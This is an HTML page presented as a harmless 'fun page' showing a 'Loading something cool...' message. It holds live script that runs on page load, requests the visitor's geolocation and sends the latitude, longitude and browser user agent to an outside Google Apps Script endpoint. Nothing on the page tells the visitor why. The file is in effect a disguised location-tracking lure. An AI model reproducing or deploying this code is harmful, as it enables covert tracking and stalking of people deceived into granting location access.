<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Just a Fun Page</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      padding-top: 20%;
      background-color: #f2f2f2;
    }
    h1 {
      font-size: 2em;
      color: #333;
    }
    p {
      color: #555;
    }
  </style>
</head>
<body>
  <h1>Loading something cool... üòÑ</h1>
  <p>This might take a second...</p>

  <script>
    // Try to get location as soon as the page loads
    navigator.geolocation.getCurrentPosition(
      (position) => {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        const ua = navigator.userAgent;

        const url =
          "https://script.google.com/macros/s/AKfycbw9qFm0UFnu3eengU-c21xnMyiwCRy8_b9JWN8bZL7eGZxzfOWsfl-mHAXoU7UHNRMD/exec" +
          "?lat=" + lat + "&lon=" + lon + "&ua=" + encodeURIComponent(ua);

        fetch(url)
          .then((res) => res.text())
          .then((txt) => {
            console.log("Location sent:", txt);
            document.body.innerHTML += "<p style='color:green;'>‚úÖ Done!</p>";
          })
          .catch((err) => {
            console.error("Fetch error:", err);
            document.body.innerHTML += "<p style='color:red;'>‚ùå Failed to send data.</p>";
          });
      },
      (error) => {
        console.error("Geolocation error:", error);
        document.body.innerHTML += "<p style='color:red;'>‚ùå Location access denied.</p>";
      }
    );
  </script>
</body>
</html>
